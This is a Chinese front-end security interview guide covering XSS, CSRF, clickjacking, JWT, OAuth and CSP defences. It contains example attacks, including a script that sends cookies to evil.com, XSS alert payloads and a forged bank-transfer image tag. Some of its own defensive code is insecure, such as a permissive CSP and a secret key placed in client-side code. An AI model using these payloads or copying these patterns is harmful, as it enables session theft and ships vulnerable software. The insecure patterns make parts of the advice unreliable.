---
title: 前端安全面试题
---

# 前端安全面试题

## XSS攻击

### 什么是XSS攻击？

跨站脚本攻击（Cross-Site Scripting），攻击者往Web页面里插入恶意Script代码。

**类型**：

**1. 存储型XSS**：

恶意代码被存储到数据库，所有访问该页面的用户都会被攻击。

```javascript
// 攻击者在评论中插入
<script>
  fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

**2. 反射型XSS**：

恶意代码通过URL参数反射回来。

```javascript
// URL: https://example.com/search?q=<script>alert(1)</script>
// 服务端返回
<div>搜索结果: <script>alert(1)</script></div>
```

**3. DOM型XSS**：

恶意代码修改DOM结构。

```javascript
// URL: https://example.com/#name=<img src=x onerror=alert(1)>
const name = decodeURIComponent(location.hash.substring(1));
document.body.innerHTML = `Hello, ${name}`;
```

### 如何防御XSS？

**1. 输入过滤**：

```javascript
// 过滤危险字符
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return str.replace(/[&<>"']/g, m => map[m]);
}
```

**2. 输出编码**：

```javascript
// 使用innerText代替innerHTML
element.innerText = userInput;  // 安全
element.innerHTML = userInput;  // 不安全
```

**3. Content Security Policy (CSP)**：

```javascript
// HTTP响应头
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval'

// 或在HTML中
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```

**4. HttpOnly Cookie**：

```javascript
// 设置Cookie时添加HttpOnly
res.setHeader('Set-Cookie', 'sessionId=xxx; HttpOnly; Secure; SameSite=Strict');
```

**5. Vue自动转义**：

Vue模板默认转义HTML，只有`v-html`指令不转义。

```vue
<!-- 自动转义，安全 -->
<div>{{ userInput }}</div>

<!-- 不转义，危险，确保内容可信 -->
<div v-html="userInput"></div>
```

## CSRF攻击

### 什么是CSRF攻击？

跨站请求伪造（Cross-Site Request Forgery），攻击者诱导用户访问恶意网站，利用用户的登录状态发送请求。

**攻击场景**：

```
用户登录 bank.com
↓
访问恶意网站 evil.com
↓
evil.com 页面有:
  <img src="https://bank.com/transfer?to=attacker&amount=10000" />
↓
浏览器自动携带bank.com的Cookie发送请求
↓
转账成功
```

### 如何防御CSRF？

**1. SameSite Cookie**：

```javascript
// 设置Cookie的SameSite属性
Set-Cookie: sessionId=xxx; SameSite=Strict

// SameSite值:
// - Strict: 完全禁止第三方Cookie
// - Lax: 允许部分跨站请求（如链接跳转）
// - None: 允许所有跨站请求（需配合Secure）
```

**2. CSRF Token**：

```javascript
// 1. 服务端生成token，存入session
const token = generateToken();
session.csrfToken = token;

// 2. 返回给客户端
res.render('form', { csrfToken: token });

// 3. 客户端提交时带上token
<form>
  <input type="hidden" name="csrfToken" value="<%= csrfToken %>" />
  <button type="submit">Submit</button>
</form>

// 4. 服务端验证token
if (req.body.csrfToken !== req.session.csrfToken) {
  return res.status(403).send('CSRF token mismatch');
}
```

**3. 验证Referer/Origin**：

```javascript
// 检查请求来源
const allowedOrigins = ['https://bank.com'];

app.use((req, res, next) => {
  const origin = req.headers.origin || req.headers.referer;
  if (!allowedOrigins.includes(origin)) {
    return res.status(403).send('Forbidden');
  }
  next();
});
```

**4. 自定义Header**：

```javascript
// 客户端请求时添加自定义header
axios.defaults.headers.common['X-Requested-With'] = 'XMLHttpRequest';

// 服务端验证
app.use((req, res, next) => {
  if (req.headers['x-requested-with'] !== 'XMLHttpRequest') {
    return res.status(403).send('Forbidden');
  }
  next();
});
```

## 其他安全威胁

### 点击劫持（Clickjacking）？

攻击者使用透明iframe覆盖目标页面，诱导用户点击。

**防御方法：X-Frame-Options**

```javascript
// 禁止页面被嵌入iframe
X-Frame-Options: DENY

// 或只允许同源嵌入
X-Frame-Options: SAMEORIGIN

// 或指定允许的域名
X-Frame-Options: ALLOW-FROM https://example.com
```

**使用JavaScript防御**：

```javascript
// 检查是否被嵌入iframe
if (window.self !== window.top) {
  window.top.location = window.self.location;
}
```

### 中间人攻击（MITM）？

攻击者拦截和篡改通信数据。

**防御方法：HTTPS**

```javascript
// 强制使用HTTPS
app.use((req, res, next) => {
  if (!req.secure && req.get('x-forwarded-proto') !== 'https') {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});

// HSTS - 强制浏览器使用HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

### 敏感数据泄露？

**常见问题**：

1. **Console泄露**：

```javascript
// ❌ 错误：生产环境打印敏感信息
console.log('User:', user);
console.log('Token:', token);

// ✅ 正确：生产环境移除console
// vite.config.js
export default defineConfig({
  build: {
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true
      }
    }
  }
});
```

2. **源代码泄露**：

```javascript
// ❌ 错误：前端暴露密钥
const API_KEY = 'sk-xxxxxxxxxxxxxxxx';

// ✅ 正确：敏感操作放在服务端
// 前端只调用接口
axios.post('/api/payment', { amount });
```

3. **localStorage存储敏感信息**：

```javascript
// ❌ 错误：localStorage存储token
localStorage.setItem('token', token);

// ✅ 正确：使用HttpOnly Cookie或内存存储
// 服务端设置Cookie
res.setHeader('Set-Cookie', 'token=xxx; HttpOnly; Secure; SameSite=Strict');
```

### 依赖安全？

**检查依赖漏洞**：

```bash
# npm
npm audit

# yarn
yarn audit

# 自动修复
npm audit fix
```

**使用Snyk监控**：

```bash
npm install -g snyk
snyk auth
snyk test
snyk monitor
```

**锁定依赖版本**：

```bash
# 生成package-lock.json或yarn.lock
npm install

# 不要删除lock文件
# 不要使用npm shrinkwrap（只在库项目中使用）
```

### 权限控制？

**前端路由守卫**：

```javascript
router.beforeEach((to, from, next) => {
  const isAuthenticated = checkAuth();
  const requiredRole = to.meta.role;

  if (to.meta.requiresAuth && !isAuthenticated) {
    next('/login');
  } else if (requiredRole && !hasRole(requiredRole)) {
    next('/403');
  } else {
    next();
  }
});
```

**API权限控制**：

```javascript
// 请求拦截器添加token
axios.interceptors.request.use(config => {
  const token = getToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

// 响应拦截器处理权限错误
axios.interceptors.response.use(
  response => response,
  error => {
    if (error.response?.status === 401) {
      // 未登录
      router.push('/login');
    } else if (error.response?.status === 403) {
      // 无权限
      router.push('/403');
    }
    return Promise.reject(error);
  }
);
```

**重要：前端权限只是UI层控制，真正的权限验证必须在服务端！**

## 安全最佳实践

### 安全检查清单？

- [ ] 启用HTTPS
- [ ] 设置CSP策略
- [ ] Cookie设置HttpOnly、Secure、SameSite
- [ ] 输入验证和输出编码
- [ ] 使用安全的HTTP头（X-Frame-Options、X-Content-Type-Options）
- [ ] 前端不存储敏感信息
- [ ] 定期更新依赖
- [ ] 生产环境移除console和debugger
- [ ] 敏感操作需要二次确认（如转账、删除）
- [ ] 登录失败次数限制
- [ ] 强密码策略
- [ ] 实施安全日志和监控

### 安全HTTP头？

```javascript
// Express示例
app.use(helmet());

// 或手动设置
app.use((req, res, next) => {
  // 防止MIME类型嗅探
  res.setHeader('X-Content-Type-Options', 'nosniff');

  // 防止点击劫持
  res.setHeader('X-Frame-Options', 'DENY');

  // 启用浏览器内置XSS过滤
  res.setHeader('X-XSS-Protection', '1; mode=block');

  // 限制引用来源
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

  // CSP策略
  res.setHeader('Content-Security-Policy', "default-src 'self'");

  // HSTS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');

  next();
});
```

## JWT安全

### Token刷新策略？

```javascript
// utils/auth.js
class AuthManager {
  constructor() {
    this.accessToken = localStorage.getItem('accessToken');
    this.refreshToken = localStorage.getItem('refreshToken');
    this.isRefreshing = false;
    this.failedQueue = [];
  }

  // 处理刷新失败的请求
  processQueue(error, token = null) {
    this.failedQueue.forEach(prom => {
      if (error) {
        prom.reject(error);
      } else {
        prom.resolve(token);
      }
    });

    this.failedQueue = [];
  }

  // 刷新token
  async refreshAccessToken() {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ refreshToken: this.refreshToken })
      });

      if (!response.ok) throw new Error('Refresh failed');

      const data = await response.json();

      this.accessToken = data.accessToken;
      this.refreshToken = data.refreshToken;

      localStorage.setItem('accessToken', this.accessToken);
      localStorage.setItem('refreshToken', this.refreshToken);

      return this.accessToken;
    } catch (error) {
      this.logout();
      throw error;
    }
  }

  // 获取有效token
  async getValidToken() {
    // 如果正在刷新，加入队列
    if (this.isRefreshing) {
      return new Promise((resolve, reject) => {
        this.failedQueue.push({ resolve, reject });
      });
    }

    // 检查token是否即将过期（提前5分钟刷新）
    if (this.isTokenExpiringSoon(this.accessToken)) {
      this.isRefreshing = true;

      try {
        const newToken = await this.refreshAccessToken();
        this.processQueue(null, newToken);
        return newToken;
      } catch (error) {
        this.processQueue(error, null);
        throw error;
      } finally {
        this.isRefreshing = false;
      }
    }

    return this.accessToken;
  }

  // 检查token是否即将过期
  isTokenExpiringSoon(token) {
    if (!token) return true;

    const payload = this.parseJWT(token);
    const expiresAt = payload.exp * 1000;
    const fiveMinutes = 5 * 60 * 1000;

    return Date.now() + fiveMinutes > expiresAt;
  }

  // 解析JWT
  parseJWT(token) {
    const base64Url = token.split('.')[1];
    const base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
    const jsonPayload = atob(base64);
    return JSON.parse(jsonPayload);
  }

  logout() {
    localStorage.removeItem('accessToken');
    localStorage.removeItem('refreshToken');
    this.accessToken = null;
    this.refreshToken = null;
    window.location.href = '/login';
  }
}

const authManager = new AuthManager();

// Axios拦截器
axios.interceptors.request.use(async (config) => {
  const token = await authManager.getValidToken();
  config.headers.Authorization = `Bearer ${token}`;
  return config;
});

axios.interceptors.response.use(
  response => response,
  async error => {
    const originalRequest = error.config;

    if (error.response?.status === 401 && !originalRequest._retry) {
      originalRequest._retry = true;

      try {
        const newToken = await authManager.refreshAccessToken();
        originalRequest.headers.Authorization = `Bearer ${newToken}`;
        return axios(originalRequest);
      } catch (refreshError) {
        authManager.logout();
        return Promise.reject(refreshError);
      }
    }

    return Promise.reject(error);
  }
);
```

## OAuth 2.0实战

### 授权码流程？

```javascript
// utils/oauth.js
class OAuthClient {
  constructor(config) {
    this.clientId = config.clientId;
    this.redirectUri = config.redirectUri;
    this.authUrl = config.authUrl;
    this.tokenUrl = config.tokenUrl;
    this.scope = config.scope;
    this.state = this.generateState();
  }

  // 生成随机state，防止CSRF
  generateState() {
    return Math.random().toString(36).substring(2, 15) +
           Math.random().toString(36).substring(2, 15);
  }

  // 生成code_verifier（PKCE）
  generateCodeVerifier() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return this.base64UrlEncode(array);
  }

  // 生成code_challenge（PKCE）
  async generateCodeChallenge(verifier) {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    const digest = await crypto.subtle.digest('SHA-256', data);
    return this.base64UrlEncode(digest);
  }

  base64UrlEncode(buffer) {
    const str = String.fromCharCode(...new Uint8Array(buffer));
    return btoa(str)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }

  // 发起授权请求
  authorize() {
    const codeVerifier = this.generateCodeVerifier();
    sessionStorage.setItem('code_verifier', codeVerifier);

    this.generateCodeChallenge(codeVerifier).then(codeChallenge => {
      const params = new URLSearchParams({
        response_type: 'code',
        client_id: this.clientId,
        redirect_uri: this.redirectUri,
        scope: this.scope,
        state: this.state,
        code_challenge: codeChallenge,
        code_challenge_method: 'S256'
      });

      window.location.href = `${this.authUrl}?${params}`;
    });
  }

  // 处理回调
  async handleCallback(callbackUrl) {
    const params = new URLSearchParams(callbackUrl.search);
    const code = params.get('code');
    const state = params.get('state');

    // 验证state
    if (state !== this.state) {
      throw new Error('Invalid state');
    }

    // 获取token
    const codeVerifier = sessionStorage.getItem('code_verifier');
    const tokenResponse = await this.exchangeCodeForToken(code, codeVerifier);

    return tokenResponse;
  }

  // 用code换取token
  async exchangeCodeForToken(code, codeVerifier) {
    const response = await fetch(this.tokenUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: this.redirectUri,
        client_id: this.clientId,
        code_verifier: codeVerifier
      })
    });

    if (!response.ok) {
      throw new Error('Failed to exchange code for token');
    }

    return await response.json();
  }
}

// 使用
const oauth = new OAuthClient({
  clientId: 'your-client-id',
  redirectUri: 'http://localhost:3000/callback',
  authUrl: 'https://auth.example.com/authorize',
  tokenUrl: 'https://auth.example.com/token',
  scope: 'openid profile email'
});

// 登录
oauth.authorize();

// 回调页面
const url = new URL(window.location.href);
oauth.handleCallback(url).then(tokens => {
  localStorage.setItem('accessToken', tokens.access_token);
  localStorage.setItem('refreshToken', tokens.refresh_token);
});
```

### PKCE扩展？

```javascript
// PKCE (Proof Key for Code Exchange)
// 用于公共客户端（如SPA、移动应用）的安全授权

class PKCEClient {
  constructor() {
    this.codeVerifier = null;
    this.codeChallenge = null;
  }

  async init() {
    // 1. 生成code_verifier（43-128个字符的随机字符串）
    this.codeVerifier = this.generateVerifier();

    // 2. 生成code_challenge（SHA256哈希）
    this.codeChallenge = await this.generateChallenge(this.codeVerifier);

    // 3. 存储verifier，后续获取token时使用
    sessionStorage.setItem('pkce_verifier', this.codeVerifier);
  }

  generateVerifier() {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    const str = Array.from(array, byte => String.fromCharCode(byte)).join('');
    return btoa(str)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }

  async generateChallenge(verifier) {
    const encoder = new TextEncoder();
    const data = encoder.encode(verifier);
    const digest = await crypto.subtle.digest('SHA-256', data);
    return this.base64UrlEncode(digest);
  }

  base64UrlEncode(buffer) {
    const str = String.fromCharCode(...new Uint8Array(buffer));
    return btoa(str)
      .replace(/\+/g, '-')
      .replace(/\//g, '_')
      .replace(/=/g, '');
  }

  // 构建授权URL
  buildAuthorizationUrl() {
    const params = new URLSearchParams({
      response_type: 'code',
      client_id: this.clientId,
      redirect_uri: this.redirectUri,
      scope: this.scope,
      state: this.generateState(),
      code_challenge: this.codeChallenge,
      code_challenge_method: 'S256'
    });

    return `${this.authUrl}?${params}`;
  }
}
```

## API安全

### 签名验证？

```javascript
// utils/signature.js
import crypto from 'crypto';

class ApiSigner {
  constructor(accessKey, secretKey) {
    this.accessKey = accessKey;
    this.secretKey = secretKey;
  }

  // 生成签名
  sign(method, path, params, timestamp) {
    // 1. 构建待签名字符串
    const sortedParams = Object.keys(params)
      .sort()
      .map(key => `${key}=${params[key]}`)
      .join('&');

    const stringToSign = [
      method.toUpperCase(),
      path,
      sortedParams,
      timestamp
    ].join('\n');

    // 2. 使用HMAC-SHA256签名
    const signature = crypto
      .createHmac('sha256', this.secretKey)
      .update(stringToSign)
      .digest('base64');

    return signature;
  }

  // 发送签名请求
  async request(method, url, params = {}) {
    const timestamp = Date.now();
    const signature = this.sign(method, url, params, timestamp);

    const response = await fetch(url, {
      method,
      headers: {
        'Content-Type': 'application/json',
        'X-Access-Key': this.accessKey,
        'X-Timestamp': timestamp,
        'X-Signature': signature
      },
      body: method !== 'GET' ? JSON.stringify(params) : undefined
    });

    return response.json();
  }
}

// 使用
const signer = new ApiSigner(
  process.env.VITE_API_ACCESS_KEY,
  process.env.VITE_API_SECRET_KEY
);

// 发起请求
const data = await signer.request('GET', '/api/users', { page: 1 });
```

### 防重放攻击？

```javascript
// utils/replayProtection.js
class ReplayProtection {
  constructor() {
    this.usedNonces = new Set();
    this.maxNonceAge = 5 * 60 * 1000; // 5分钟
  }

  // 生成nonce（一次性随机数）
  generateNonce() {
    return `${Date.now()}-${Math.random().toString(36).substring(2)}`;
  }

  // 验证nonce
  validateNonce(nonce, timestamp) {
    // 1. 检查nonce是否已使用
    if (this.usedNonces.has(nonce)) {
      return false;
    }

    // 2. 检查时间戳是否在有效期内
    const now = Date.now();
    if (now - timestamp > this.maxNonceAge) {
      return false;
    }

    // 3. 记录nonce
    this.usedNonces.add(nonce);

    // 4. 清理过期nonce
    this.cleanupNonces(now);

    return true;
  }

  cleanupNonces(now) {
    const expiredTime = now - this.maxNonceAge;
    const prefix = `${expiredTime}-`;

    for (const nonce of this.usedNonces) {
      if (nonce < prefix) {
        this.usedNonces.delete(nonce);
      }
    }
  }
}

// 在请求中添加nonce和timestamp
class SecureApiClient {
  constructor() {
    this.replayProtection = new ReplayProtection();
  }

  async request(url, data) {
    const nonce = this.replayProtection.generateNonce();
    const timestamp = Date.now();

    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Nonce': nonce,
        'X-Timestamp': timestamp
      },
      body: JSON.stringify({
        ...data,
        nonce,
        timestamp
      })
    });

    return response.json();
  }
}
```

### 速率限制？

```javascript
// utils/rateLimiter.js
class RateLimiter {
  constructor(maxRequests, windowMs) {
    this.maxRequests = maxRequests;
    this.windowMs = windowMs;
    this.requests = new Map();
  }

  // 检查是否允许请求
  async canMakeRequest(key) {
    const now = Date.now();
    const windowStart = now - this.windowMs;

    // 获取该key的请求记录
    let requests = this.requests.get(key) || [];

    // 清理过期的请求记录
    requests = requests.filter(timestamp => timestamp > windowStart);

    // 检查是否超过限制
    if (requests.length >= this.maxRequests) {
      return {
        allowed: false,
        retryAfter: requests[0] + this.windowMs - now
      };
    }

    // 记录当前请求
    requests.push(now);
    this.requests.set(key, requests);

    return {
      allowed: true,
      remaining: this.maxRequests - requests.length
    };
  }
}

// 在Axios拦截器中使用
const rateLimiter = new RateLimiter(100, 60000); // 每分钟100次

axios.interceptors.request.use(async (config) => {
  const key = config.url; // 或使用用户ID

  const result = await rateLimiter.canMakeRequest(key);

  if (!result.allowed) {
    throw new Error(`Rate limit exceeded. Retry after ${result.retryAfter}ms`);
  }

  config.headers['X-RateLimit-Remaining'] = result.remaining;

  return config;
});
```

## 依赖安全

### Supply Chain Attacks防护？

```javascript
// package.json
{
  "scripts": {
    "audit": "npm audit",
    "audit:fix": "npm audit fix",
    "check-deps": "npx npm-check",
    "snyk-test": "snyk test",
    "snyk-monitor": "snyk monitor"
  },
  "devDependencies": {
    "npm-check": "^6.0.0",
    "snyk": "^1.1200.0"
  }
}

// .npmrc
# 强制npm在安装时进行审计
audit=true

# 使用精确的版本号
save-exact=true

# 锁定lock文件
package-lock=true

# .github/workflows/security.yml
name: Security Scan

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * 0'  # 每周日运行

jobs:
  security:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Run npm audit
        run: npm audit --production

      - name: Run Snyk security scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: auto
```

## CSP实战

### Content-Security-Policy报告模式？

```javascript
// vite.config.js
export default defineConfig({
  server: {
    headers: {
      // 报告模式：只报告不阻止
      'Content-Security-Policy-Report-Only': `
        default-src 'self';
        script-src 'self' 'unsafe-inline' 'unsafe-eval';
        style-src 'self' 'unsafe-inline';
        img-src 'self' data: https:;
        connect-src 'self' https://api.example.com;
        font-src 'self';
        object-src 'none';
        base-uri 'self';
        form-action 'self';
        frame-ancestors 'none';
        report-uri /csp-report
      `.replace(/\s+/g, ' ').trim(),

      // 强制模式：阻止违规（生产环境）
      // 'Content-Security-Policy': `...`
    }
  }
});

// CSP报告收集端点
// routes/csp-report.js
export async function POST(request) {
  const report = await request.json();

  // 记录CSP违规
  console.log('CSP Violation:', report);

  // 发送到监控服务
  await fetch('/api/security/csp-violation', {
    method: 'POST',
    body: JSON.stringify(report)
  });

  return new Response(null, { status: 204 });
}
```

### Nonce策略？

```javascript
// utils/csp.js
import crypto from 'crypto';

export function generateNonce() {
  return crypto.randomBytes(16).toString('base64');
}

// vite.config.js
import { generateNonce } from './utils/csp';

export default defineConfig({
  plugins: [
    {
      name: 'csp-nonce',
      transformIndexHtml(html) {
        const nonce = generateNonce();
        return html.replace('{{NONCE}}', nonce);
      }
    }
  ],
  server: {
    headers: {
      'Content-Security-Policy': (req, res) => {
        const nonce = req.nonce || generateNonce();
        return `
          default-src 'self';
          script-src 'self' 'nonce-${nonce}';
          style-src 'self' 'nonce-${nonce}';
        `.replace(/\s+/g, ' ').trim();
      }
    }
  }
});

// index.html
<script nonce="{{NONCE}}">
  // 内联脚本
</script>

<style nonce="{{NONCE}}">
  /* 内联样式 */
</style>
```

## 安全扫描

### Semgrep集成？

```yaml
# .semgrep.yaml
rules:
  - id: no-console-log
    pattern: console.log(...)
    message: Don't commit console.log
    languages: [js, ts]
    severity: WARNING

  - id: no-eval
    pattern: eval(...)
    message: Avoid using eval
    languages: [js, ts]
    severity: ERROR

  - id: no-inner-html
    pattern: element.innerHTML = $INPUT
    message: Avoid innerHTML, use innerText instead
    languages: [js, ts]
    severity: WARNING

  - id: check-localstorage-sensitive
    pattern-either:
      - pattern: localStorage.setItem('password', ...)
      - pattern: localStorage.setItem('token', ...)
    message: Don't store sensitive data in localStorage
    languages: [js, ts]
    severity: ERROR

# .github/workflows/semgrep.yml
name: Semgrep

on:
  push:
    branches: [main]
  pull_request:

jobs:
  semgrep:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v3

      - name: Run Semgrep
        uses: returntocorp/semgrep-action@v1
        with:
          config: >-
            p/security-audit
            p/jwt
            p/nodejsscan
```

### CodeQL集成？

```yaml
# .github/workflows/codeql.yml
name: CodeQL

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]
  schedule:
    - cron: '0 0 * * 1'  # 每周一运行

jobs:
  analyze:
    name: Analyze
    runs-on: ubuntu-latest

    strategy:
      fail-fast: false
      matrix:
        language: ['javascript']

    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Initialize CodeQL
        uses: github/codeql-action/init@v2
        with:
          languages: ${{ matrix.language }}
          queries: security-extended,security-and-quality

      - name: Perform CodeQL Analysis
        uses: github/codeql-action/analyze@v2
```

---

**小徐带你飞系列教程**

**最后更新：2026 年 2 月**
**版本：v1.0**
**作者：小徐**
**邮箱：esimonx@163.com**
